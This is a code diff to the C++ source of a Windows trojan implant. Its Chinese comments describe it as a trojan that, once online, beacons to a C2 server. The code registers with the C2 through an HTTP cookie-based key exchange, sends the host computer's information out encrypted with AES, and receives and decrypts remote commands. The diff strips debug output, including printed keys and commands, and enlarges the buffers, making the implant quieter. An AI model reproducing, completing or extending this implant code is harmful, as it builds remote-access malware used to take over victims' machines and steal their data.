@@ -67,7 +67,7 @@ void networkSuitInitial() {
 void initSocket() {
     WSADATA wsaData;
     if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        TOTAL_PRINTF("error at WSAStartup\n");
+        //TOTAL_PRINTF("error at WSAStartup\n");
         exit(-1);
     }
    
@@ -80,18 +80,18 @@ void initSocket() {
 void connectSocket() {
      sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(sock == INVALID_SOCKET) {
-        TOTAL_PRINTF("Error at create socket\n");
+        //TOTAL_PRINTF("Error at create socket\n");
         exit(-1);
     }
     if(connect(sock, (sockaddr *)&addr, sizeof(addr)) != 0) {
-        TOTAL_PRINTF("Error in connect. code = %d\n", WSAGetLastError());
+        //TOTAL_PRINTF("Error in connect. code = %d\n", WSAGetLastError());
         closesocket(sock);
         WSACleanup();
         exit(-1);
     }
 }
 
-char buf[4096];
+char buf[0x600000];
 /* ok 是接收到的 200 OK 响应包
  * 将会读取响应包中的数据部分
  * 使用 data 和 len 分别存储数据部分的指针和长度 */
@@ -110,32 +110,32 @@ void analyze200OK(char *ok, char **data, int *len) {
 /* 木马上线后, 将定期向 C2 发送一次 Post 请求
  * 同时用这个函数接收一次 200 OK 响应
  * 因此在这个函数中需要存在针对 C2 命令的解析 */
-char cmd[4096];
+char cmd[0x600000];
 void Receive200OK() {
     int recvLen = RECV_BUF
     CLOSE_SOCK
 
-    TOTAL_PRINTF("received %d bytes\n", recvLen);
+    //TOTAL_PRINTF("received %d bytes\n", recvLen);
     // todo
     char *encryptCMD;
     int cmdLen;
     analyze200OK(buf, &encryptCMD, &cmdLen);
     if(cmdLen == 0) return;
 
-    TOTAL_PRINTF("encryptCMD = \n");
-    hexDump((PBYTE)encryptCMD, cmdLen);
+    //TOTAL_PRINTF("encryptCMD = \n");
+    //hexDump((PBYTE)encryptCMD, cmdLen);
 
     memmove(cmd, encryptCMD, cmdLen);
     globalAES->DecryptData((PBYTE)cmd, &cmdLen);
 
-    TOTAL_PRINTF("Decrypted CMD = \n");
-    hexDump((PBYTE)cmd, cmdLen);
+    //TOTAL_PRINTF("Decrypted CMD = \n");
+    //hexDump((PBYTE)cmd, cmdLen);
     
     short cmdNum = *((short *)cmd);
     char *args = cmd + 2;
     int argsLen = cmdLen - 2;
     args[argsLen] = '\x00';
-    TOTAL_PRINTF("cmd = %d, args = %s\n", cmdNum, args);
+    //TOTAL_PRINTF("cmd = %d, args = %s\n", cmdNum, args);
 
     char *message;
     int msgLen;
@@ -151,23 +151,23 @@ void Receive200OK() {
     if(message != nullptr) {
         inQueue(message);
     }
-    TOTAL_PRINTF("close socket\n");
+    //TOTAL_PRINTF("close socket\n");
     
 }
 /* 在套接字已建立连接的情况下
  * 调用这个函数来向 C2 发送数据包 */
 void sockSend(char *buf, int len) {
     if(send(sock, buf, len, 0) == SOCKET_ERROR) {
-        TOTAL_PRINTF("Error in send\n");
+        //TOTAL_PRINTF("Error in send\n");
         closesocket(sock);
         WSACleanup();
         exit(0);
     }
 }
-char msgEncrypt[4096];
+char msgEncrypt[0x600000];
 void PostBreath() {
     while(true) {
-        printf("try to breath\n");
+        //TOTAL_PRINTF("try to breath\n");
         Sleep(config.sleep);
         connectSocket();
         Queue node = outQueue();
@@ -189,7 +189,7 @@ void PostBreath() {
         }
         
         sockSend(buf, len);
-        TOTAL_PRINTF("send %d bytes\n", len);
+        //TOTAL_PRINTF("send %d bytes\n", len);
         Receive200OK();
     }
 }
@@ -210,7 +210,7 @@ void registerC2() {
     encryptA = a_b11.toBytes();
     len = sprintf(buf, httpPostHead, 16, temp) - 1;
     hexDump((PBYTE)buf, len);
-    TOTAL_PRINTF("\n\n");
+    //TOTAL_PRINTF("\n\n");
     for(i = 0; i < 16; i++) {
         buf[len + i] = encryptA[i];
     }
@@ -218,7 +218,7 @@ void registerC2() {
     hexDump((PBYTE)buf, len);*/
 
     // Step.1 向 C2 发送 GET 请求, cookie 中包含 Base64[AES(a, a)]
-    TOTAL_PRINTF("Step.1 Send GET to C2, cookie = Base64[AES(a, a)]\n");
+    //TOTAL_PRINTF("Step.1 Send GET to C2, cookie = Base64[AES(a, a)]\n");
 
     OblivionisAES aes(config.a);
     encryptA = (PBYTE)malloc(0x24);
@@ -229,23 +229,23 @@ void registerC2() {
     len = sprintf(buf, httpGetHead, base64);
 
 
-    TOTAL_PRINTF("base64 = %s\n", base64);
-    TOTAL_PRINTF("HTTP Request = \n%s\n", buf);
+    //TOTAL_PRINTF("base64 = %s\n", base64);
+    //TOTAL_PRINTF("HTTP Request = \n%s\n", buf);
     connectSocket();
     sockSend(buf, len);
     free(base64);
     free(encryptA);
 
     // Step.2 接收 C2 发回的 200 OK，查看其中是否存在 0xbeebeebe
-    TOTAL_PRINTF("Step.2 Receive 200 OK from C2, check the 0xbeebeebe\n");
+    //TOTAL_PRINTF("Step.2 Receive 200 OK from C2, check the 0xbeebeebe\n");
     RECV_BUF
     CLOSE_SOCK
     analyze200OK(buf, &base64, &len);
     if(*((DWORD *)base64) != 0xbeebeebe) {
-        TOTAL_PRINTF("Cannot found 0xbeebeebe, or failed to analyze 200 OK pack\n");
+        //TOTAL_PRINTF("Cannot found 0xbeebeebe, or failed to analyze 200 OK pack\n");
         //exit(0);
     }else {
-        TOTAL_PRINTF("Receive 0xbeebeebe successful\n");
+        //TOTAL_PRINTF("Receive 0xbeebeebe successful\n");
     }
 
 
@@ -259,12 +259,12 @@ void registerC2() {
         buf[len + i] = encryptA[i];
     }
     len += 16;
-    TOTAL_PRINTF("Step.3 Send a^b1 to C2.\n");
-    TOTAL_PRINTF("a^b1 = \n");
-    hexDump(encryptA, 16);
-    TOTAL_PRINTF("as hex = ");
+    //TOTAL_PRINTF("Step.3 Send a^b1 to C2.\n");
+    //TOTAL_PRINTF("a^b1 = \n");
+    //hexDump(encryptA, 16);
+    //TOTAL_PRINTF("as hex = ");
     a_b1.printHex();
-    TOTAL_PRINTF("\n");
+    //TOTAL_PRINTF("\n");
 
     Sleep(config.sleep);
     connectSocket();
@@ -275,33 +275,33 @@ void registerC2() {
     RECV_BUF
     CLOSE_SOCK
     analyze200OK(buf, &base64, &len);
-    TOTAL_PRINTF("Step.4 Receive a^b2 from C2\n");
+    //TOTAL_PRINTF("Step.4 Receive a^b2 from C2\n");
     Uint128 a_b2 = Uint128((PBYTE)base64);
     Uint128 key = a_b2.modPow(b1);
     globalAES = new OblivionisAES(key.toBytes());
-    TOTAL_PRINTF("a^b2 = \n");
-    hexDump(a_b2.toBytes(), 16);
-    TOTAL_PRINTF("as hex = ");
-    a_b2.printHex();
-    TOTAL_PRINTF("\nKey = \n");
-    hexDump(key.toBytes(), 16);
-    TOTAL_PRINTF("as hex = ");
-    key.printHex();
+    //TOTAL_PRINTF("a^b2 = \n");
+    //hexDump(a_b2.toBytes(), 16);
+    //TOTAL_PRINTF("as hex = ");
+    //a_b2.printHex();
+    //TOTAL_PRINTF("\nKey = \n");
+    //hexDump(key.toBytes(), 16);
+    //TOTAL_PRINTF("as hex = ");
+    //key.printHex();
 
 
     // Step.5 提交宿主机信息
-    TOTAL_PRINTF("\nStep.5 Post info of the computer.\n");
+    //TOTAL_PRINTF("\nStep.5 Post info of the computer.\n");
     char buf2[1024];
     for(len = 0; info[len] != '\x00'; len++) {
         buf2[len] = info[len];
     }
     len++;
-    hexDump((PBYTE)buf2, len);
+    //hexDump((PBYTE)buf2, len);
     globalAES->EncryptData((PBYTE)buf2, &len);
-    printf("\nencrypt data = \n");
-    hexDump((PBYTE)buf2, len);
-    printf("\nAES key = \n");
-    hexDump(globalAES->g_Key, 176);
+    //TOTAL_PRINTF("\nencrypt data = \n");
+    //hexDump((PBYTE)buf2, len);
+    //TOTAL_PRINTF("\nAES key = \n");
+    //hexDump(globalAES->g_Key, 176);
 
     int httpLen = sprintf(buf, httpPostHead, len, temp) - 1;
     for(i = 0; i < len; i++) {
